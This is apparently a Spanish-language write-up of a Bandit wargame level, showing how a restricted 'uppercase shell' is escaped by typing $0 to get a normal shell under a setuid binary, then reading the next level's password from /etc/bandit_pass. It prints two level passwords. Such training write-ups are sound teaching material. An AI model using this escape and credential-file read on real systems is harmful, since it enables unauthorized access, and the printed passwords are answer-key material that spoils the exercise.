
## Objetivo
After all this `git` stuff its time for another escape. Good luck!

## Datos de acceso al nivel
bandit32
rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
## Solución
```
WELCOME TO THE UPPERCASE SHELL
>> ls
sh: 1: LS: Permission denied
>> $0
$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Oct  5 06:19 .
drwxr-xr-x 70 root     root      4096 Oct  5 06:20 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
-rwsr-x---  1 bandit33 bandit32 15128 Oct  5 06:19 uppershell
$ whoami
bandit33
$ cat /etc/bandit_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
$
```
## Notas adicionales
- Úselo `$0`para encontrar el [shell conectado](https://linuxhandbook.com/login-shell/)
- Úselo `$0`para imprimir el nombre del script que se está ejecutando.
## Referencias 
https://linuxhandbook.com/bash-dollar-0/